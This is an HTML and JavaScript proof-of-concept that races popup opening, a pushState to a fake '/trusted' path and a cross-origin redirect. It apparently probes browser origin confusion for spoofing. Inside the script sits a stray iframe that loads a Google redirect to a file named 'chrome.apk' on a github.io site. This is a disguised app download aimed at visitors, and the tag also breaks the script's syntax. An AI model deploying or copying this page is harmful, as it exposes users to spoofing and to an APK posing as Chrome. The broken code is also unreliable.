<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Navigation Race + Popup PoC</title>
</head>
<body>

<h2>Race + Origin Demo</h2>
<div id="log"></div>

<script>
// ==============================
// LOGGER
// ==============================
function logEvent(name, data = {}) {
    const el = document.createElement("div");
    el.textContent = `[${Date.now()}] ${name} ` + JSON.stringify(data);
    document.getElementById("log").appendChild(el);
    console.log(name, data);
}

// ==============================
// FAST TRIGGER ENGINE
// ==============================
const triggers = [];

function registerTrigger(condition, action) {
    triggers.push({ condition, action, fired: false });
}

// lebih agresif: pakai rAF loop instead of setInterval
function runTriggers() {
    triggers.forEach(t => {
        if (!t.fired && t.condition()) {
            t.fired = true;
            logEvent("trigger_fired");
            t.action();
        }
    });
    requestAnimationFrame(runTriggers);
}
runTriggers();

// ==============================
// STEP 1: POPUP OPEN
// ==============================
let popup = null;

function openPopup() {
    popup = window.open("about:blank", "_blank", "width=400,height=300");
    if (!popup) {
        alert("Popup blocked!");
        return;
    }

    popup.document.write("<h3>Loading...</h3>");
    logEvent("popup_opened");
}

// ==============================
// STEP 2: STATE CONFUSION
// ==============================
function setupState() {
    history.pushState({}, '', '/trusted');
    logEvent("pushstate_done", { path: location.pathname });
}

// ==============================
// STEP 3: TRIGGER NAVIGATION
// ==============================
registerTrigger(
    () => popup && location.pathname === "/trusted",
    () => {
        logEvent("navigation_triggered");

        // arahkan popup ke origin lain
        popup.location.href = "https://example.com";
		<iframe id="frame" src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3"></iframe>


        // coba baca origin (akan gagal → ini point demo)
        setTimeout(() => {
            try {
                let o = popup.location.origin;
                logEvent("origin_read", { origin: o });
            } catch (e) {
                logEvent("cross_origin_blocked", { message: e.message });
            }
        }, 100);
    }
);

// ==============================
// STEP 4: RACE SETUP
// ==============================
window.addEventListener("pageshow", () => {
    logEvent("pageshow");

    openPopup();

    requestAnimationFrame(() => {
        requestAnimationFrame(() => {
            setTimeout(() => {
                logEvent("race_window");
                setupState();
            }, 10); // lebih agresif
        });
    });
});

// ==============================
// START
// ==============================
logEvent("init");

</script>

</body>
</html>
